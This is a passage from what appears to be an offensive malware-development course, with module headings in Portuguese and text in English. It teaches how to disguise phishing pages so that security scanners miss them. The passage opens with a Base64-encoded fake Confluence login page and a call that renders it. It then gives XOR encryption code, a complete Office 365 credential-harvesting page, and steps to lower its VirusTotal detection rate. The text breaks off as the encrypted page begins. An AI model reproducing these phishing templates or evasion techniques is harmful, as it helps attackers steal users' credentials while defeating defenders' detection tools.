JTIwcGFzc3dvcmREaXYuYXBwZW5kQ2hpbGQocGFzc3dvcmRMYWJlbCklM0IlMEElMjAlMjAlMjAlMjBwYXNzd29yZERpdi5hcHBlbmRDaGlsZChwYXNzd29yZElucHV0KSUzQiUwQSUyMCUyMCUyMCUyMGVsZW0uYXBwZW5kQ2hpbGQocGFzc3dvcmREaXYpJTNCJTBBJTBBJTIwJTIwJTIwJTIwdmFyJTIwYnV0dG9uRGl2JTIwJTNEJTIwZG9jdW1lbnQuY3JlYXRlRWxlbWVudCglMjJkaXYlMjIpJTNCJTBBJTIwJTIwJTIwJTIwdmFyJTIwc3VibWl0QnV0dG9uJTIwJTNEJTIwZG9jdW1lbnQuY3JlYXRlRWxlbWVudCglMjJidXR0b24lMjIpJTNCJTBBJTIwJTIwJTIwJTIwc3VibWl0QnV0dG9uLnR5cGUlMjAlM0QlMjAlMjJzdWJtaXQlMjIlM0IlMEElMjAlMjAlMjAlMjBzdWJtaXRCdXR0b24udGV4dENvbnRlbnQlMjAlM0QlMjAlMjJMb2clMjBJbiUyMiUzQiUwQSUyMCUyMCUyMCUyMGJ1dHRvbkRpdi5hcHBlbmRDaGlsZChzdWJtaXRCdXR0b24pJTNCJTBBJTIwJTIwJTIwJTIwZWxlbS5hcHBlbmRDaGlsZChidXR0b25EaXYpJTNCJTBBJTBBJTIwJTIwJTIwJTIwY29udGFpbmVyLmFwcGVuZENoaWxkKGVsZW0pJTNCJTBBJTBBJTIwJTIwJTIwJTIwdmFyJTIwZm9yZ290UGFzc3dvcmREaXYlMjAlM0QlMjBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCUyMmRpdiUyMiklM0IlMEElMjAlMjAlMjAlMjBmb3Jnb3RQYXNzd29yZERpdi5jbGFzc05hbWUlMjAlM0QlMjAlMjJmb3Jnb3QtcGFzc3dvcmQlMjIlM0IlMEElMjAlMjAlMjAlMjB2YXIlMjBmb3Jnb3RQYXNzd29yZExpbmslMjAlM0QlMjBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCUyMmElMjIpJTNCJTBBJTIwJTIwJTIwJTIwZm9yZ290UGFzc3dvcmRMaW5rLmhyZWYlMjAlM0QlMjAlMjIlMjMlMjIlM0IlMEElMjAlMjAlMjAlMjBmb3Jnb3RQYXNzd29yZExpbmsudGV4dENvbnRlbnQlMjAlM0QlMjAlMjJDYW4ndCUyMGxvZyUyMGluJTNGJTIyJTNCJTBBJTIwJTIwJTIwJTIwZm9yZ290UGFzc3dvcmREaXYuYXBwZW5kQ2hpbGQoZm9yZ290UGFzc3dvcmRMaW5rKSUzQiUwQSUyMCUyMCUyMCUyMGNvbnRhaW5lci5hcHBlbmRDaGlsZChmb3Jnb3RQYXNzd29yZERpdiklM0IlMEElMEElMjAlMjAlMjAlMjBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNvbnRhaW5lciklM0IlMEElMEElMjAlMjAlMjAlMjB2YXIlMjBzdHlsZSUyMCUzRCUyMGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJTIyc3R5bGUlMjIpJTNCJTBBJTIwJTIwJTIwJTIwc3R5bGUudGV4dENvbnRlbnQlMjAlM0QlMjAlNjAlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBib2R5JTIwJTdCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZm9udC1mYW1pbHklM0ElMjBBcmlhbCUyQyUyMHNhbnMtc2VyaWYlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBiYWNrZ3JvdW5kLWNvbG9yJTNBJTIwJTIzZjRmNWY3JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZGlzcGxheSUzQSUyMGZsZXglM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBqdXN0aWZ5LWNvbnRlbnQlM0ElMjBjZW50ZXIlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBhbGlnbi1pdGVtcyUzQSUyMGNlbnRlciUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGhlaWdodCUzQSUyMDEwMHZoJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwbWFyZ2luJTNBJTIwMCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCU3RCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjAlN0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBiYWNrZ3JvdW5kLWNvbG9yJTNBJTIwJTIzZmZmZmZmJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwYm9yZGVyJTNBJTIwMXB4JTIwc29saWQlMjAlMjNkZmUxZTYlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBib3JkZXItcmFkaXVzJTNBJTIwNXB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwcGFkZGluZyUzQSUyMDMwcHglM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB3aWR0aCUzQSUyMDMwMHB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwYm94LXNoYWRvdyUzQSUyMDAlMjAxcHglMjAzcHglMjByZ2JhKDAlMkMlMjAwJTJDJTIwMCUyQyUyMDAuMSklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB0ZXh0LWFsaWduJTNBJTIwY2VudGVyJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTdEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwLmxvZ2luLWNvbnRhaW5lciUyMGgxJTIwJTdCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZm9udC1zaXplJTNBJTIwMjRweCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMG1hcmdpbi1ib3R0b20lM0ElMjAyMHB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwY29sb3IlM0ElMjAlMjMwMDUyY2MlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAubG9naW4tY29udGFpbmVyJTIwbGFiZWwlMjAlN0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBkaXNwbGF5JTNBJTIwYmxvY2slM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBtYXJnaW4tYm90dG9tJTNBJTIwNXB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwdGV4dC1hbGlnbiUzQSUyMGxlZnQlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAubG9naW4tY29udGFpbmVyJTIwaW5wdXQlNUJ0eXBlJTNEJTIydGV4dCUyMiU1RCUyQyUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjBpbnB1dCU1QnR5cGUlM0QlMjJwYXNzd29yZCUyMiU1RCUyQyUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjBidXR0b24lMjAlN0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB3aWR0aCUzQSUyMDEwMCUyNSUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMG1heC13aWR0aCUzQSUyMDMwMHB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwcGFkZGluZyUzQSUyMDEwcHglM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBtYXJnaW4tYm90dG9tJTNBJTIwMTBweCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJvcmRlciUzQSUyMDFweCUyMHNvbGlkJTIwJTIzZGZlMWU2JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwYm9yZGVyLXJhZGl1cyUzQSUyMDNweCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJveC1zaXppbmclM0ElMjBib3JkZXItYm94JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTdEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwLmxvZ2luLWNvbnRhaW5lciUyMGJ1dHRvbiUyMCU3QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJhY2tncm91bmQtY29sb3IlM0ElMjAlMjMwMDUyY2MlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBjb2xvciUzQSUyMCUyM2ZmZmZmZiUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJvcmRlciUzQSUyMG5vbmUlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBjdXJzb3IlM0ElMjBwb2ludGVyJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZm9udC1zaXplJTNBJTIwMTZweCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCU3RCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjBidXR0b24lM0Fob3ZlciUyMCU3QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJhY2tncm91bmQtY29sb3IlM0ElMjAlMjMwNzQ3YTYlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAubG9naW4tY29udGFpbmVyJTIwLmZvcmdvdC1wYXNzd29yZCUyMCU3QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMG1hcmdpbi10b3AlM0ElMjAxMHB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZm9udC1zaXplJTNBJTIwMTRweCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCU3RCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjAuZm9yZ290LXBhc3N3b3JkJTIwYSUyMCU3QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGNvbG9yJTNBJTIwJTIzMDA1MmNjJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwdGV4dC1kZWNvcmF0aW9uJTNBJTIwbm9uZSUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCU3RCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjAuZm9yZ290LXBhc3N3b3JkJTIwYSUzQWhvdmVyJTIwJTdCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwdGV4dC1kZWNvcmF0aW9uJTNBJTIwdW5kZXJsaW5lJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTdEJTBBJTIwJTIwJTIwJTIwJTYwJTNCJTBBJTIwJTIwJTIwJTIwZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzdHlsZSklM0IlMEElN0Q=")));

// REQUIRED: Invoke function to display the phishing page
createConfluencePhishing();
</script>

```

## Conclusão
Although we were able to encode our frontend code using Base64 to reduce detections, this obfuscation method has several drawbacks. First, the use of `atob` and `btoa` can serve as malicious indicators, especially when combined with `eval` or `document.write`. Second, Base64 is easy to decode, and some security scanners have automatic detection and decoding capabilities for Base64-encoded content. Lastly, Base64 encoding generates a static encoded string, meaning that the same content will always produce the same result, making it susceptible to signature-based detection. These issues will be addressed in upcoming modules that explore alternative obfuscation techniques.

## Objetivos
Use JavaScript to obfuscate atob, btoa and document.write

Break up the Base64 blob into two or more parts and dynamically reconstruct them and render the phishing page

Instead of using document.write, use an alternative method to dynamically inject content into the page

Research the Function Constructor and use this as an alternative to executing JavaScript code instead of eval


---

# Módulo 44 — Anti-Análise Via Ofuscação XOR

Módulo 44 — Anti-Analysis Via XOR Obfuscation

- # Módulo 44 — Anti-Análise Via Ofuscação XOR

# Disclaimer

## Introdução
Previously we used Base64 encoding to obfuscate our HTML, CSS, and JavaScript contents. Despite the improvement in detection rates, it was noted that Base64 can be easily decoded, as some automated tools are programmed to decode Base64 as part of their built-in functionality.In this module, we'll introduce XOR encryption and incorporate it on a phishing page to reduce detection rates.
## Criptografia XOR de Chave Única
The first iteration of our XOR algorithm will be relatively simple. Below we create the `xorEncryptDecrypt` function which takes two arguments:
`input` - The string to be encrypted or decrypted.

- `key` - The key used for the encryption process. This should be one letter.

The function will then go through the `input` one letter at a time and perform a logical XOR with the first character of the `key` argument.

```
function xorEncryptDecrypt(input, key) {
    let output = '';
	const keyChar = key.charCodeAt(0);

	for (let i = 0; i < input.length; i++) {
        let charCode = input.charCodeAt(i);
        let xorCharCode = charCode ^ keyChar;
        output += String.fromCharCode(xorCharCode);
    }

    return output;
}

```
The sample code below uses the `xorEncryptDecrypt` function to encrypt and decrypt the string "Maldev Academy" and prints the results to the console.

```
function xorEncryptDecrypt(input, key) {
    let output = '';
	const keyChar = key.charCodeAt(0);

	for (let i = 0; i < input.length; i++) {
        let charCode = input.charCodeAt(i);
        let xorCharCode = charCode ^ keyChar;
        output += String.fromCharCode(xorCharCode);
    }

    return output;
}

var input = "Maldev Academy";
const key = 'K'; // Encryption key

// Encrypt & decrypt
var enc = xorEncryptDecrypt(input,key);
var dec = xorEncryptDecrypt(enc,key);

console.log("Encrypted: " + enc);
console.log("Decrypted: " + dec);

```

### Encoding Results
Our initial `xorEncryptDecrypt` function performs its intended functionality of encrypting and decrypting the text correctly. However, an issue that one would encounter when using this function is the output of an XOR operation can potentially result in invalid characters being generated. This issue is shown in the image below.

To resolve this issue, we need to include functionality in our function to encode the text after encryption and decode it prior to decryption. The updated `xorEncryptDecrypt` function includes a new parameter, `encode`, where if it's set to `true`, the output will be URL-encoded after the XOR operation to ensure it contains only valid ASCII characters. On the other hand, if `encode` parameter is set to `false`, the function will first URL-decode the input before proceeding with the XOR operation to correctly decrypt the data.

```
function xorEncryptDecrypt(input, key, encode) {
    let output = '';
    const keyChar = key.charCodeAt(0);

    if (!encode) {
        input = decodeURIComponent(input);
    }

    // XOR
    for (let i = 0; i < input.length; i++) {
        let charCode = input.charCodeAt(i);
        let xorCharCode = charCode ^ keyChar;
        output += String.fromCharCode(xorCharCode);
    }

    if (encode) {
        output = encodeURIComponent(output);
    }

    return output;
}

```
The code below uses the updated `xorEncryptDecrypt` function to encrypt and decrypt the string "Maldev Academy" and prints the results to the console.

```
function xorEncryptDecrypt(input, key, encode) {
    let output = '';
    const keyChar = key.charCodeAt(0);

    if (!encode) {
        input = decodeURIComponent(input);
    }

    // XOR
    for (let i = 0; i < input.length; i++) {
        let charCode = input.charCodeAt(i);
        let xorCharCode = charCode ^ keyChar;
        output += String.fromCharCode(xorCharCode);
    }

    if (encode) {
        output = encodeURIComponent(output);
    }

    return output;
}

var input = "Maldev Academy";
const key = 'K'; // Encryption key

// Encrypt & decrypt
var enc = xorEncryptDecrypt(input,key,true);
var dec = xorEncryptDecrypt(enc,key,false);

console.log("Encrypted: " + enc);
console.log("Decrypted: " + dec);

```
Notice that the encryption result does not cause a line break because it has been URL-encoded.

## Criptografia XOR Multi-Chave
Previously, the key was limited to a single character, which is considered weak encryption. The updated `xorEncryptDecrypt` function will now iterate over the entirety of the multi-character key and perform the encryption, making it more resilient.

```
function xorEncryptDecrypt(input, key, encode) {
    let output = '';
    let keyIndex = 0;

    if (!encode) {
        input = decodeURIComponent(input);
    }

    // XOR using full key
    for (let i = 0; i < input.length; i++) {
        let charCode = input.charCodeAt(i);
        let keyCharCode = key.charCodeAt(keyIndex);
        let xorCharCode = charCode ^ keyCharCode;
        output += String.fromCharCode(xorCharCode);

        // Update key index to cycle through the key
        keyIndex = (keyIndex + 1) % key.length;
    }

    if (encode) {
        output = encodeURIComponent(output);
    }

    return output;
}

```

```
// Usage

var original = "Maldev Academy"; // String to encrypt
const key = 'MaldevAcademy123'; // Multi-character encryption key

// Encrypt
var encryptedText = xorEncryptDecrypt(original,key,true)

// Decrypt
var decryptedText = xorEncryptDecrypt(encryptedText,key,false)

```

### XOR Encryption Demo
We will use the the single-key `xorEncryptDecrypt` function to obfuscate a signatured phishing page and reduce the detection rate. To start, download the `o365.html` file found on GitHub. The file is a template for a standard Office 365 phishing page. The contents of the file have been provided below for convenience.

```
<html>
<head>
	<title>Sign in to Microsoft Online Services</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes"/><meta http-equiv="Pragma" content="no-cache"/><meta http-equiv="Expires" content="-1"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="PageID" content="i5030.2.0"/><meta name="SiteID" content="10"/><meta name="ReqLC" content="1033"/><meta name="LocLC" content="1033"/><meta name="mswebdialog-newwindowurl" content="*"/>
	<link href="https://web.archive.org/web/20211124193620/https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/images/favicon_a.ico" rel="SHORTCUT ICON" />
	<link href="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/css/login.ltr.css" rel="stylesheet" type="text/css" /><script src="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/js/jquery.1.5.1.min.js" type="text/javascript"></script><script src="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/js/aad.login.js" type="text/javascript"></script><script src="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/js/jquery.easing.1.3.js" type="text/javascript"></script>
	<style type="text/css">body {
            display: none;
        }
	</style>
</head>
<body><script>
        if (self == top) {
            var body = $('body');
            body.css('display', 'block');
        } else {
            top.location = self.location;
        }
    </script>
<div class="ie_legacy" id="background_branding_container" style="background: #FFFFFF"><img alt="Illustration for Microsoft Online Services" id="background_background_image" />
<div class="background_title_text" id="background_company_name_text"> </div>
</div>

<div class="overlay ie_legacy" id="background_page_overlay"> </div>

<div class="login_panel" id="login_no_script_panel">
<table class="login_panel_layout" style="height: 100%;">
	<tbody>
		<tr class="login_panel_layout_row" style="height: 100%;">
			<td id="login_panel_left"> </td>
			<td id="login_panel_center"> </td>
			<td id="login_panel_right"> </td>
		</tr>
	</tbody>
</table>
</div>

<div class="login_panel" id="login_panel">
<table class="login_panel_layout" style="height: 100%;">
	<tbody>
		<tr class="login_panel_layout_row" style="height: 100%;">
			<td id="login_panel_left"> </td>
			<td id="login_panel_center"><!--office365 logo--><script type="text/javascript">
                        $(document).ready(function() {

                            Constants.DEFAULT_LOGO = 'https://web.archive.org/web/20201012165953/https://secure.aadcdn.microsoftonline-p.com/aadbranding/1.0.1/aadlogin/office365/logo.png';
                            Constants.DEFAULT_LOGO_ALT = 'Sign in';
                            Constants.DEFAULT_ILLUSTRATION = 'https://web.archive.org/web/20211125201800/https://secure.aadcdn.microsoftonline-p.com/aadbranding/1.0.1/aadlogin/Office365/illustration.jpg';
                            Constants.DEFAULT_BACKGROUND_COLOR = '#EB3C00';

                            Context.TenantBranding.workload_branding_enabled = true;
                            User.UpdateLogo(Constants.DEFAULT_LOGO, Constants.DEFAULT_LOGO_ALT);
                            User.UpdateBackground(Constants.DEFAULT_ILLUSTRATION, Constants.DEFAULT_BACKGROUND_COLOR);
                            Context.TenantBranding.whr_key = '';
                            jQuery('img#logo_img').attr('src', '');
                            Context.use_instrumentation = true;
                            User.moveFooterToBottom('250px');
                        });
                    </script>
			<div class="login_inner_container">
			<div class="inner_container cred">
			<div class="login_workload_logo_container"> </div>

			<div class="login_cta_container normaltext">
			<div class="cta_message_text 1" id="login_cta_text">Sign in with your organizational account</div>
			</div>

			<ul class="login_cred_container">
				<li class="login_cred_field_container">
				<div class="login_textfield textfield" id="cred_userid_container"><span class="input_field textfield"><label class="no_display" for="UsernameForm">User account</label> </span>

				<div class="input_border">
				<form action="" autocomplete="off" method="POST" name="LoginForm"><br />
				<span class="input_field textfield"><input class="login_textfield textfield required email field normaltext" name="UsernameForm" placeholder="someone@example.com " tabindex="1" type="text" /><br />
				<br />
				<input aria-label="Password" class="login_textfield textfield required field normaltext" name="password" placeholder="Password" tabindex="2" type="password" /><br />
				<br />
				<br />
				<input class="button normaltext cred_sign_in_button refresh_domain_state" type="submit" value="Sign In" /> </span></form>
				</div>
				<span class="input_field textfield"> </span>

				<div class="login_textfield textfield" id="cred_password_container"><span class="input_field textfield"><span class="input_field textfield"><label class="no_display" for="PasswordForm">Password</label> </span></span>

				<div class="input_border"> </div>
				<span class="input_field textfield"><span class="input_field textfield"> </span> </span></div>
				<span class="input_field textfield"> </span>

				<div class="no_display" id="cred_hidden_inputs_container"><span class="input_field textfield"><input id="PPSX" name="PPSX" type="hidden" value="PassportRN" /> <input id="i0327" name="PPFT" type="hidden" value="A1F6YNWGa2YkRUNNhPfW3T8PcqsjHEeiQmp*m*wFwPyxag08*cPrW*SpZSnKeqiDJI*EUu8ceb42zjM89!r*ck!Q6kkHvZYoRPC53LwqFG6O6YCE5yI3mHRGLjK6BurKT332TUIqbZPBSJiw!cfoJN2PCje1NESa7hs4mIzcHNmkN7DO0RJOeoWX8r1DK*UBFpxFwOw$" /> </span></div>
				<span class="input_field textfield"> </span></div>
				</li>
				<li class="login_cred_options_container">
				<div class="subtext normaltext" id="cred_kmsi_container"><span class="input_field "><input id="cred_keep_me_signed_in_checkbox" name="persist" tabindex="10" type="checkbox" value="0" /> <label class="persist_text" for="cred_keep_me_signed_in_checkbox" id="keep_me_signed_in_label_text">Keep me signed in</label> </span></div>
				</li>
			</ul>
			</div>
			</div>
			</td>
		</tr>
	</tbody>
</table>
</div>
</body>
</html>

```

Upload the file to VirusTotal to check the rate of detection by security vendors. Since this is a publicly available template, it's likely that the page has already been signatured by some security vendors. VirusTotal confirms our assumption as three vendors detected the page as a phishing page.

The next step is to use our `xorEncryptDecrypt` function to encrypt the contents of the page. We will exclude the `<html>` tags from the encryption process as these tags will be statically added to the page instead.

```
function xorEncryptDecrypt(input, key, encode) {
    let output = '';
    const keyChar = key.charCodeAt(0);

    if (!encode) {
        input = decodeURIComponent(input);
    }

    // XOR
    for (let i = 0; i < input.length; i++) {
        let charCode = input.charCodeAt(i);
        let xorCharCode = charCode ^ keyChar;
        output += String.fromCharCode(xorCharCode);
    }

    if (encode) {
        output = encodeURIComponent(output);
    }

    return output;
}

const original = `
<head>
	<title>Sign in to Microsoft Online Services</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes"/><meta http-equiv="Pragma" content="no-cache"/><meta http-equiv="Expires" content="-1"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="PageID" content="i5030.2.0"/><meta name="SiteID" content="10"/><meta name="ReqLC" content="1033"/><meta name="LocLC" content="1033"/><meta name="mswebdialog-newwindowurl" content="*"/>
	<link href="https://web.archive.org/web/20211124193620/https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/images/favicon_a.ico" rel="SHORTCUT ICON" />
	<link href="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/css/login.ltr.css" rel="stylesheet" type="text/css" /><script src="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/js/jquery.1.5.1.min.js" type="text/javascript"></script><script src="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/js/aad.login.js" type="text/javascript"></script><script src="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/js/jquery.easing.1.3.js" type="text/javascript"></script>
	<style type="text/css">body {
            display: none;
        }
	</style>
</head>
<body><script>
        if (self == top) {
            var body = $('body');
            body.css('display', 'block');
        } else {
            top.location = self.location;
        }
    </script>
<div class="ie_legacy" id="background_branding_container" style="background: #FFFFFF"><img alt="Illustration for Microsoft Online Services" id="background_background_image" />
<div class="background_title_text" id="background_company_name_text"> </div>
</div>

<div class="overlay ie_legacy" id="background_page_overlay"> </div>

<div class="login_panel" id="login_no_script_panel">
<table class="login_panel_layout" style="height: 100%;">
	<tbody>
		<tr class="login_panel_layout_row" style="height: 100%;">
			<td id="login_panel_left"> </td>
			<td id="login_panel_center"> </td>
			<td id="login_panel_right"> </td>
		</tr>
	</tbody>
</table>
</div>

<div class="login_panel" id="login_panel">
<table class="login_panel_layout" style="height: 100%;">
	<tbody>
		<tr class="login_panel_layout_row" style="height: 100%;">
			<td id="login_panel_left"> </td>
			<td id="login_panel_center"><!--office365 logo--><script type="text/javascript">
                        $(document).ready(function() {

                            Constants.DEFAULT_LOGO = 'https://web.archive.org/web/20201012165953/https://secure.aadcdn.microsoftonline-p.com/aadbranding/1.0.1/aadlogin/office365/logo.png';
                            Constants.DEFAULT_LOGO_ALT = 'Sign in';
                            Constants.DEFAULT_ILLUSTRATION = 'https://web.archive.org/web/20211125201800/https://secure.aadcdn.microsoftonline-p.com/aadbranding/1.0.1/aadlogin/Office365/illustration.jpg';
                            Constants.DEFAULT_BACKGROUND_COLOR = '#EB3C00';

                            Context.TenantBranding.workload_branding_enabled = true;
                            User.UpdateLogo(Constants.DEFAULT_LOGO, Constants.DEFAULT_LOGO_ALT);
                            User.UpdateBackground(Constants.DEFAULT_ILLUSTRATION, Constants.DEFAULT_BACKGROUND_COLOR);
                            Context.TenantBranding.whr_key = '';
                            jQuery('img#logo_img').attr('src', '');
                            Context.use_instrumentation = true;
                            User.moveFooterToBottom('250px');
                        });
                    </script>
			<div class="login_inner_container">
			<div class="inner_container cred">
			<div class="login_workload_logo_container"> </div>

			<div class="login_cta_container normaltext">
			<div class="cta_message_text 1" id="login_cta_text">Sign in with your organizational account</div>
			</div>

			<ul class="login_cred_container">
				<li class="login_cred_field_container">
				<div class="login_textfield textfield" id="cred_userid_container"><span class="input_field textfield"><label class="no_display" for="UsernameForm">User account</label> </span>

				<div class="input_border">
				<form action="" autocomplete="off" method="POST" name="LoginForm"><br />
				<span class="input_field textfield"><input class="login_textfield textfield required email field normaltext" name="UsernameForm" placeholder="someone@example.com " tabindex="1" type="text" /><br />
				<br />
				<input aria-label="Password" class="login_textfield textfield required field normaltext" name="password" placeholder="Password" tabindex="2" type="password" /><br />
				<br />
				<br />
				<input class="button normaltext cred_sign_in_button refresh_domain_state" type="submit" value="Sign In" /> </span></form>
				</div>
				<span class="input_field textfield"> </span>

				<div class="login_textfield textfield" id="cred_password_container"><span class="input_field textfield"><span class="input_field textfield"><label class="no_display" for="PasswordForm">Password</label> </span></span>

				<div class="input_border"> </div>
				<span class="input_field textfield"><span class="input_field textfield"> </span> </span></div>
				<span class="input_field textfield"> </span>

				<div class="no_display" id="cred_hidden_inputs_container"><span class="input_field textfield"><input id="PPSX" name="PPSX" type="hidden" value="PassportRN" /> <input id="i0327" name="PPFT" type="hidden" value="A1F6YNWGa2YkRUNNhPfW3T8PcqsjHEeiQmp*m*wFwPyxag08*cPrW*SpZSnKeqiDJI*EUu8ceb42zjM89!r*ck!Q6kkHvZYoRPC53LwqFG6O6YCE5yI3mHRGLjK6BurKT332TUIqbZPBSJiw!cfoJN2PCje1NESa7hs4mIzcHNmkN7DO0RJOeoWX8r1DK*UBFpxFwOw$" /> </span></div>
				<span class="input_field textfield"> </span></div>
				</li>
				<li class="login_cred_options_container">
				<div class="subtext normaltext" id="cred_kmsi_container"><span class="input_field "><input id="cred_keep_me_signed_in_checkbox" name="persist" tabindex="10" type="checkbox" value="0" /> <label class="persist_text" for="cred_keep_me_signed_in_checkbox" id="keep_me_signed_in_label_text">Keep me signed in</label> </span></div>
				</li>
			</ul>
			</div>
			</div>
			</td>
		</tr>
	</tbody>
</table>
</div>
</body>
`;

// Our key is "E"
// Encoding is set to true since we're encrypting
xorEncryptDecrypt(original, "E", true)

```
Execute the script to produce the XOR-encrypted and URL-encoded phishing page.

The encrypted contents will be stored in a new HTML page, `O365-XOR.html`, which will have the encrypted content, the `xorEncryptDecrypt` function to perform the decryption, and then finally use `document.write` to write the decrypted contents onto the page. Note that we've compressed the `xorEncryptDecrypt` function to be less-readable.

```
<!DOCTYPE html>
<html>
<script>
